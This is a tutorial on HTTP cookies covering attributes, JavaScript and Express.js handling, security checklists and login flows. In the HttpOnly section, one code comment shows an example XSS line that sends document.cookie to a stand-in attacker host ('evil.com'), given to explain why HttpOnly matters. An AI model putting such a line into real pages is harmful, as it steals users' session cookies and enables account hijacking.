# HTTP Cookies

## Overview

HTTP cookies are small pieces of data that servers send to browsers, which browsers store and send back with subsequent requests. Cookies enable stateful sessions over the stateless HTTP protocol, powering features like user authentication, shopping carts, and preferences.

---

## What Are Cookies?

Cookies solve HTTP's statelessness problem by allowing servers to store information in the client's browser.

```
Without Cookies:
┌────────┐                              ┌────────┐
│ Client │ ─── Request 1 ─────────────> │ Server │
│        │ <── Response 1 ───────────── │        │
│        │                              │        │
│        │ ─── Request 2 ─────────────> │ Who    │
│        │     (Server doesn't know     │ are    │
│        │      this is the same user!) │ you?   │
└────────┘                              └────────┘

With Cookies:
┌────────┐                              ┌────────┐
│ Client │ ─── Request 1 ─────────────> │ Server │
│        │ <── Response 1 ───────────── │        │
│        │     Set-Cookie: session=abc  │        │
│        │                              │        │
│ Stores │ ─── Request 2 ─────────────> │ Ah,    │
│ cookie │     Cookie: session=abc      │ you're │
│        │ <── Response 2 ───────────── │ abc!   │
└────────┘                              └────────┘
```

---

## Cookie Syntax

### Setting Cookies (Server → Client)

```http
HTTP/1.1 200 OK
Set-Cookie: name=value
Set-Cookie: session=abc123; Path=/; HttpOnly; Secure; SameSite=Strict
Set-Cookie: preferences=dark; Max-Age=31536000
```

### Sending Cookies (Client → Server)

```http
GET /api/profile HTTP/1.1
Host: example.com
Cookie: session=abc123; preferences=dark
```

---

## Cookie Attributes

### Complete Cookie Syntax

```http
Set-Cookie: name=value; Domain=example.com; Path=/; Expires=Wed, 21 Oct 2024 07:28:00 GMT; Max-Age=3600; Secure; HttpOnly; SameSite=Strict
```

### Attribute Reference

| Attribute | Description | Default |
|-----------|-------------|---------|
| **Domain** | Cookie valid for this domain and subdomains | Current domain only |
| **Path** | Cookie valid for this path | Current path |
| **Expires** | Expiration date (absolute) | Session cookie |
| **Max-Age** | Lifetime in seconds | Session cookie |
| **Secure** | Only send over HTTPS | Not set (send over HTTP too) |
| **HttpOnly** | Not accessible via JavaScript | Not set |
| **SameSite** | Cross-site request restrictions | Lax (in most browsers) |

### Domain Attribute

```http
# Cookie for exact domain only (most restrictive)
Set-Cookie: session=abc  (no Domain attribute)
# Sent to: example.com only

# Cookie for domain and all subdomains
Set-Cookie: session=abc; Domain=example.com
# Sent to: example.com, www.example.com, api.example.com

# Cannot set cookie for different domain
Set-Cookie: session=abc; Domain=other-site.com  # Rejected!
```

### Path Attribute

```http
# Cookie for all paths
Set-Cookie: session=abc; Path=/
# Sent to: /api, /users, /admin, etc.

# Cookie for specific path only
Set-Cookie: admin=xyz; Path=/admin
# Sent to: /admin, /admin/users, /admin/settings
# NOT sent to: /, /api, /users
```

### Expiration

```http
# Session cookie (deleted when browser closes)
Set-Cookie: session=abc
Set-Cookie: session=abc; Max-Age=0  # Delete immediately

# Persistent cookie (with absolute expiration)
Set-Cookie: remember=xyz; Expires=Wed, 21 Oct 2025 07:28:00 GMT

# Persistent cookie (with relative lifetime)
Set-Cookie: remember=xyz; Max-Age=31536000  # 1 year in seconds

# If both Expires and Max-Age are set, Max-Age takes precedence
```

### Secure Attribute

```http
# Only send over HTTPS
Set-Cookie: session=abc; Secure

# Without Secure - sent over HTTP and HTTPS (vulnerable!)
Set-Cookie: session=abc

# Best practice: Always use Secure for sensitive cookies
```

```
┌─────────────────────────────────────────────────────────────┐
│                    Secure Attribute                          │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  HTTP Request:                                               │
│  ├── Cookie without Secure → Sent (VULNERABLE!)             │
│  └── Cookie with Secure → NOT Sent                          │
│                                                              │
│  HTTPS Request:                                              │
│  ├── Cookie without Secure → Sent                           │
│  └── Cookie with Secure → Sent (Secure)                     │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

### HttpOnly Attribute

```http
# Not accessible via JavaScript
Set-Cookie: session=abc; HttpOnly

# Without HttpOnly - accessible via document.cookie
Set-Cookie: preferences=dark
```

```javascript
// With HttpOnly flag - XSS protection
document.cookie; // Cannot read session=abc

// Without HttpOnly - vulnerable to XSS
document.cookie; // "preferences=dark"

// XSS attack could steal cookies without HttpOnly
// Attacker's script: fetch('https://evil.com/steal?cookie=' + document.cookie)
```

### SameSite Attribute

Controls when cookies are sent with cross-site requests.

```http
# Strict - Never sent in cross-site requests
Set-Cookie: session=abc; SameSite=Strict

# Lax - Sent with top-level navigations (clicks, but not POST)
Set-Cookie: session=abc; SameSite=Lax

# None - Sent with all requests (requires Secure)
Set-Cookie: tracking=xyz; SameSite=None; Secure
```

#### SameSite Behavior

```
┌─────────────────────────────────────────────────────────────┐
│                    SameSite Attribute                        │
├─────────────────────────────────────────────────────────────┤
│ Request Type              │ Strict │ Lax    │ None          │
├───────────────────────────┼────────┼────────┼───────────────┤
│ Click link from other site│ No     │ Yes    │ Yes           │
│ Form GET from other site  │ No     │ Yes    │ Yes           │
│ Form POST from other site │ No     │ No     │ Yes           │
│ iframe/img from other site│ No     │ No     │ Yes           │
│ AJAX from other site      │ No     │ No     │ Yes           │
│ Same-site requests        │ Yes    │ Yes    │ Yes           │
└───────────────────────────┴────────┴────────┴───────────────┘
```

---

## Cookie Types

### Session vs Persistent Cookies

```http
# Session Cookie - no expiration, deleted when browser closes
Set-Cookie: session=abc123

# Persistent Cookie - survives browser restart
Set-Cookie: remember_me=xyz; Max-Age=2592000  # 30 days
```

### First-Party vs Third-Party Cookies

```
First-Party Cookies:
├── Set by the domain you're visiting
├── Used for core functionality
└── Example: example.com sets cookie for example.com

Third-Party Cookies:
├── Set by other domains (embedded content)
├── Used for tracking, ads, analytics
├── Example: ads.tracker.com sets cookie on example.com
└── Being phased out by browsers!
```

---

## Working with Cookies in JavaScript

### Reading Cookies

```javascript
// Get all cookies (only non-HttpOnly)
const cookies = document.cookie;
// Returns: "name=value; other=something"

// Parse cookies into object
function getCookies() {
    return document.cookie
        .split('; ')
        .reduce((acc, cookie) => {
            const [name, value] = cookie.split('=');
            acc[name] = decodeURIComponent(value);
            return acc;
        }, {});
}

const cookies = getCookies();
console.log(cookies.preferences); // "dark"
```

### Setting Cookies

```javascript
// Set a simple cookie
document.cookie = "username=john";

// Set with attributes
document.cookie = "preferences=dark; path=/; max-age=31536000";

// Set with expiration date
const expires = new Date();
expires.setFullYear(expires.getFullYear() + 1);
document.cookie = `token=abc123; expires=${expires.toUTCString()}; path=/`;

// Note: Cannot set HttpOnly cookies via JavaScript (that's the point!)
// Note: Cannot read HttpOnly cookies via JavaScript
```

### Deleting Cookies

```javascript
// Delete by setting expired date
document.cookie = "username=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/";

// Delete by setting max-age to 0
document.cookie = "preferences=; max-age=0; path=/";
```

---

## Working with Cookies in Node.js

### Reading Cookies (Express.js)

```javascript
const express = require('express');
const cookieParser = require('cookie-parser');

const app = express();
app.use(cookieParser());

app.get('/profile', (req, res) => {
    // Access parsed cookies
    const session = req.cookies.session;
    const preferences = req.cookies.preferences;

    // Signed cookies (if using secret)
    const secureData = req.signedCookies.secureData;

    res.json({ session, preferences });
});
```

### Setting Cookies (Express.js)

```javascript
app.post('/login', (req, res) => {
    // Simple cookie
    res.cookie('session', 'abc123');

    // Cookie with options
    res.cookie('session', 'abc123', {
        domain: 'example.com',
        path: '/',
        maxAge: 3600000,  // 1 hour in milliseconds
        httpOnly: true,
        secure: true,
        sameSite: 'strict'
    });

    // Signed cookie (requires cookie-parser with secret)
    res.cookie('secureData', 'sensitive', { signed: true });

    res.json({ message: 'Logged in' });
});

app.post('/logout', (req, res) => {
    // Clear cookie
    res.clearCookie('session', { path: '/' });
    res.json({ message: 'Logged out' });
});
```

---

## Cookie Security

### Security Checklist

```
Essential Cookie Security:
┌─────────────────────────────────────────────────────────────┐
│ ✓ Use HttpOnly for session cookies (prevent XSS)           │
│ ✓ Use Secure flag (HTTPS only)                              │
│ ✓ Use SameSite=Strict or Lax (prevent CSRF)                │
│ ✓ Set appropriate expiration                                │
│ ✓ Limit Path and Domain scope                               │
│ ✓ Don't store sensitive data in cookies                     │
│ ✓ Use signed/encrypted cookies for integrity                │
│ ✓ Regenerate session IDs after login                        │
└─────────────────────────────────────────────────────────────┘
```

### Common Vulnerabilities

```
1. Session Hijacking (XSS)
   Problem: Attacker steals session cookie via XSS
   Solution: HttpOnly flag

2. Session Hijacking (Network)
   Problem: Cookie intercepted over HTTP
   Solution: Secure flag + HTTPS

3. Cross-Site Request Forgery (CSRF)
   Problem: Attacker tricks user into making requests
   Solution: SameSite attribute + CSRF tokens

4. Session Fixation
   Problem: Attacker sets known session ID
   Solution: Regenerate session after login

5. Cookie Overflow
   Problem: Too many/large cookies
   Solution: Keep cookies minimal, use server-side storage
```

### Recommended Cookie Configuration

```http
# Session Cookie (most secure)
Set-Cookie: session=abc123; Path=/; HttpOnly; Secure; SameSite=Strict

# Remember Me Cookie
Set-Cookie: remember=token123; Path=/; Max-Age=2592000; HttpOnly; Secure; SameSite=Lax

# Preferences Cookie (can be less strict)
Set-Cookie: theme=dark; Path=/; Max-Age=31536000; SameSite=Lax

# API Authentication (if using cookies)
Set-Cookie: access_token=jwt123; Path=/api; HttpOnly; Secure; SameSite=Strict
```

---

## Cookie Limits

### Browser Limits

| Limit | Value |
|-------|-------|
| Max cookies per domain | ~50-180 |
| Max cookie size | ~4KB |
| Total cookies size per domain | ~4KB-10KB |

### Best Practices

```
DO:
✓ Keep cookies small (store ID, not data)
✓ Store large data server-side
✓ Use meaningful cookie names
✓ Set appropriate expiration
✓ Document cookie usage (GDPR)

DON'T:
✗ Store sensitive data in cookies
✗ Create too many cookies
✗ Forget to set security attributes
✗ Use cookies for large data
```

---

## Cookies vs Other Storage

```
┌─────────────────────────────────────────────────────────────┐
│                   Client-Side Storage                        │
├─────────────┬──────────────────────────────────────────────┤
│             │ Cookies     │ localStorage │ sessionStorage  │
├─────────────┼─────────────┼──────────────┼─────────────────┤
│ Capacity    │ ~4KB        │ ~5-10MB      │ ~5-10MB         │
│ Expiration  │ Set by attr │ Never        │ Tab close       │
│ Sent to     │ Yes (auto)  │ No           │ No              │
│ server      │             │              │                 │
│ Accessible  │ If no       │ Yes          │ Yes             │
│ by JS       │ HttpOnly    │              │                 │
│ Scope       │ Domain/Path │ Origin       │ Origin + Tab    │
│ Use case    │ Auth, prefs │ App data     │ Temp data       │
└─────────────┴─────────────┴──────────────┴─────────────────┘
```

---

## Practical Examples

### Login Flow with Cookies

```javascript
// Server-side (Express.js)
app.post('/login', async (req, res) => {
    const { username, password } = req.body;

    // Validate credentials
    const user = await validateUser(username, password);
    if (!user) {
        return res.status(401).json({ error: 'Invalid credentials' });
    }

    // Create session
    const sessionId = generateSecureId();
    await saveSession(sessionId, user.id);

    // Set session cookie
    res.cookie('session', sessionId, {
        httpOnly: true,
        secure: process.env.NODE_ENV === 'production',
        sameSite: 'strict',
        maxAge: 24 * 60 * 60 * 1000  // 24 hours
    });

    res.json({ message: 'Logged in', user: { id: user.id, name: user.name } });
});

app.get('/profile', async (req, res) => {
    const sessionId = req.cookies.session;
    if (!sessionId) {
        return res.status(401).json({ error: 'Not authenticated' });
    }

    const session = await getSession(sessionId);
    if (!session) {
        res.clearCookie('session');
        return res.status(401).json({ error: 'Session expired' });
    }

    const user = await getUser(session.userId);
    res.json(user);
});

app.post('/logout', (req, res) => {
    const sessionId = req.cookies.session;
    if (sessionId) {
        deleteSession(sessionId);
    }
    res.clearCookie('session', { path: '/' });
    res.json({ message: 'Logged out' });
});
```

### Remember Me Feature

```javascript
app.post('/login', async (req, res) => {
    const { username, password, rememberMe } = req.body;

    // ... validate credentials ...

    // Session cookie
    const sessionId = generateSecureId();
    res.cookie('session', sessionId, {
        httpOnly: true,
        secure: true,
        sameSite: 'strict',
        // No maxAge = session cookie (deleted on browser close)
    });

    // Remember me token (optional)
    if (rememberMe) {
        const rememberToken = generateSecureToken();
        await saveRememberToken(user.id, rememberToken);

        res.cookie('remember', rememberToken, {
            httpOnly: true,
            secure: true,
            sameSite: 'lax',
            maxAge: 30 * 24 * 60 * 60 * 1000  // 30 days
        });
    }

    res.json({ message: 'Logged in' });
});
```

---

## Key Takeaways

1. **Cookies enable state** - They let servers remember clients
2. **HttpOnly prevents XSS** - Session cookies should always use it
3. **Secure prevents interception** - Always use with HTTPS
4. **SameSite prevents CSRF** - Use Strict or Lax for protection
5. **Keep cookies small** - Store IDs, not data
6. **Session vs Persistent** - Choose based on requirements
7. **Security is essential** - Follow the security checklist

---

## Summary

HTTP cookies are fundamental to web applications, enabling:
- User authentication and sessions
- Shopping carts and user preferences
- Analytics and tracking

Always prioritize security by using HttpOnly, Secure, and SameSite attributes appropriately.
